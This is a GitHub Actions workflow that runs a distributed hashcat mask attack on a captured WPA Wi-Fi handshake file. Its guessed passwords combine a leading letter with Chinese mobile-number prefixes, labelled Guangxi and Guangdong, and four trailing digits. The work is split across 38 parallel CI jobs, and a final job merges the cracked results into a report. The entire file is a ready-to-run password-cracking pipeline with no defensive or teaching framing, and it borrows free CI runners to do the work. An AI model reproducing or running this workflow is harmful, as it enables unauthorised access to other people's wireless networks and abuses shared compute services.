name: Crack

on:
  workflow_dispatch:

permissions:
  contents: write
  actions: write

jobs:
  crack:
    runs-on: ubuntu-latest

    strategy:
      matrix:
        prefix:
          - a
          - b
          - c
          - d
          - e
          - f
          - g
          - h
          - i
          - j
          - k
          - l
          - m
          - n
          - o
          - p
          - q
          - r
          - s
          - t
          - u
          - v
          - w
          - x
          - y
          - z
          - A
          - B
          - C
          - D
          - E
          - F
          - G
          - H
          - I
          - J
          - K
          - L

    steps:
      - uses: actions/checkout@v3

      - name: Install hashcat
        run: |
          sudo apt-get update
          sudo apt-get install -y hashcat

      - name: Create Guangxi + Guangdong prefix7 list
        run: |
          cat << EOF > prefix7.txt
              1380771
              1380772
              1380773
              1380774
              1380775
              1380776
              1380777
              1380778
              1380779
              1590771
              1590772
              1590773
              1590774
              1590775
              1590776
              1590777
              1590778
              1590779
              1470771
              1470772
              1470773
              1470774
              1470775
              1470776
              1470777
              1470778
              1470779
            EOF

      - name: Run mask attack for all prefix7
        run: |
          while read p; do
            hashcat -m 22000 -a 3 \
              hs/wifi-02.hc22000 \
              "${{ matrix.prefix }}$p?d?d?d?d" \
              -o result_${{ matrix.prefix }}.txt \
              --append-output \
              --status --status-timer=60 \
              --potfile-disable || true
          done < prefix7.txt

      - name: Ensure result exists
        run: |
          if [ ! -f result_${{ matrix.prefix }}.txt ]; then
            touch result_${{ matrix.prefix }}.txt
          fi

      - name: Upload result
        uses: actions/upload-artifact@v4
        with:
          name: results_${{ matrix.prefix }}
          path: result_${{ matrix.prefix }}.txt

  finalize:
    needs: crack
    runs-on: ubuntu-latest

    steps:
      - uses: actions/checkout@v3

      - name: Download all results
        uses: actions/download-artifact@v4
        with:
          pattern: results_*
          merge-multiple: true

      - name: Merge results
        run: |
          cat result_*.txt 2>/dev/null > all_results.txt || true

      - name: Generate report
        run: |
          if [ -s all_results.txt ]; then
            echo "PASSWORD FOUND" > report.txt
            cat all_results.txt >> report.txt
          else
            echo "PASSWORD NOT FOUND" > report.txt
          fi

      - name: Upload report
        uses: actions/upload-artifact@v4
        with:
          name: report
          path: report.txt
